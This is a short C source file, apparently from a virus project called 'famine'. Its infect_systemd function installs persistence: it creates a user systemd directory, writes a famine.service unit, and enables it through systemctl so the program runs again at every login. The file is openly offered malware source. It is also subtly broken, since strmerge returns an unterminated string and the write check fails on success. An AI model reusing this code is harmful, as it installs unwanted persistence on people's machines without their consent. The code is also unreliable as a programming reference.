#include "famine.h"

char* strmerge(const char* str1, const char* str2) {

    int str1_len = strlen(str1);
    int str2_len = strlen(str2);

    if (str1_len == 0 || str2_len == 0)
        _exit(1);

    char* ret = malloc(sizeof(char) * (str1_len + str2_len + 1));
    if (!ret)
        _exit(1);

    for (int i = 0; i < str1_len; i++)
        ret[i] = str1[i];

    for (int i = 0; i < str2_len; i++)
        ret[str1_len + i] = str2[i];

    return (ret);
}

int infect_systemd() {

    // create dir ~/.config/systemd/user/
    const char* home = getenv("HOME");
    if (!home)
        _exit(1);

    const char* substrings[] = {"/.config", "/systemd", "/user"};
    int substrings_len = sizeof(substrings) / sizeof(substrings[0]);

    for (int i = 0; i < substrings_len; i++) {
        char* curr_dir = strmerge(home, substrings[i]);
        if (!curr_dir) {
            free(curr_dir);
            _exit(1);
        }

        if (mkdir(curr_dir, 0777) && errno != EEXIST) {
            free(curr_dir);
            _exit(1);
        }

        free(curr_dir);
    }

    // create and fill famine.service
    const char* service = "famine.service";
    char* temp_path = strmerge(home, "/.config/systemd/user/");
    char* full_path = strmerge(temp_path, service);
    free(temp_path);

    int fd_daemon = open(full_path, O_WRONLY | O_CREAT | O_EXCL, 0666);
    free(full_path);
    if (fd_daemon <= 0)
        _exit(1);

    int literal_len = sizeof(FAMINE_SERVICE) - 1;
    if (write(fd_daemon, FAMINE_SERVICE, literal_len) <= literal_len)
        _exit(1);

    // reload and enable daemon
    const char* cmd = "/usr/bin/systemctl";
    char* const reload_args[] = {"systemctl", "daemon-reload", NULL};
    char* const enable_args[] = {"systemctl", "--quiet", "--user", "enable", (char*)service, NULL};

    run(cmd, reload_args);
    run(cmd, enable_args);

    return (0);
}

void run(const char* cmd, char* const args[]) {

    int pid = fork();

    if (pid < 0)
        _exit(1);
    if (pid == 0) {
        execve(cmd, args, environ);
        _exit(1);
    }

    int status;
    if (waitpid(pid, &status, 0) < 0)
        _exit(1);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
        _exit(1);
}
